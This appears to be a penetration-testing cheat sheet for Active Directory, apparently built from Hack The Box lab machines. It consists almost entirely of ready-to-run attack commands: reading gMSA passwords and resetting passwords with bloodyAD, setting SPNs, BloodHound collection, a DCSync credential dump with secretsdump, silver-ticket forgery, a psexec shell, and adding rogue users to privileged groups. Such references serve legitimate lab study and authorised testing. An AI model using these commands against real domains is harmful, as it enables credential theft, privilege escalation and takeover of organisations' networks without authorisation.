---
description: >-
  Active Directory (AD) is a Microsoft service that manages and organizes users,
  devices, and resources in a network. It handles authentication, security, and
  access control.
---

# Active Directory

### <mark style="color:yellow;">BloodyAd.py</mark>

```powershell
# ReadGMSAPassword
bloodyAD.py --host dc01.vintage.htb -d "VINTAGE.HTB" -k get object 'GMSA01$' --attr msDS-ManagedPassword 

# Add to group
bloodyAD.py --host dc01.vintage.htb -d "VINTAGE.HTB" -k add groupMember "SERVICEMANAGERS" "P.Rosa"

# Change password
bloodyAD.py --host "dc01.vintage.htb" --dc-ip "10.10.11.45" -d "vintage.htb" -k set password "SVC_SQL" "pass@123"

# Enable account
bloodyAD.py -d ZENCORP.HTB --host dc01.zencorp.htb -k remove uac SVC_SQL -f ACCOUNTDISABLE
```

### <mark style="color:yellow;">Set SPN - Service Principal Name</mark>

```powershell
# Using kinit
KRB5CCNAME=/home/kali/bloodyAD/jjones.ccache python bloodyAD.py --host dc01.zencorp.htb -d 'ZENCORP.HTB' -u jjones -p "pass123" -k set object 'SVC_SQL' serviceprincipalname -v 'zen/notlegit'

# Using auth
bloodyAD.py --host dc01.zencorp.htb -d 'ZENCORP.HTB' -u jjones -p "pass123" set object 'SVC_SQL' serviceprincipalname -v 'zen/notlegit'

# Powershell
Set-ADUser -Identity svc_sql -Add @{servicePrincipalName="cifs/x"}
```

### <mark style="color:yellow;">Enable account</mark>

```powershell
# Using kinit
bloodyAD.py -d ZENCORP.HTB --host dc01.zencorp.htb -k remove uac SVC_SQL -f ACCOUNTDISABLE
```

### <mark style="color:yellow;">Bloodhound</mark>

```powershell
# Run sharphound on target
.\SharpHound.exe

# Run from host
bloodhound-python -u 'username' -p 'password' -d ZENCORP.LOCAL -ns 10.10.10.175 -c All
```

### <mark style="color:yellow;">DCSync attack</mark>

```powershell
# If user has DCSync Rights or DS-Replication-Get-Changes-All
secretsdump.py -outputfile hashes -just-dc ZENCORP/username@172.12.52.51
```

### <mark style="color:yellow;">Silver ticket</mark>

```powershell
# Creating the ticket
python ticketer.py -nthash 1048894cfad799f435b2f14452421b3d -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain dc.domain.htb -dc-ip 127.0.0.1 -spn TEST/dc.domain.htb administrator

# Set environment variable
KRB5CCNAME=administrator.ccache mssqlclient.py -k administrator@dc.domain.htb

# Check if needed to add to hosts
127.0.0.1 dc.domain.htb domain.htb
```

### <mark style="color:yellow;">Get a shell</mark>

```powershell
psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

### <mark style="color:yellow;">Add user to group or localgroup</mark>

```powershell
# Add new user
net user mczen pass@123 /add /domain

# Add to groups
net group "Exchange Windows Permissions" mczen /add

# Add localgroup win-rm
net localgroup "Remote Management Users" mczen /add
```
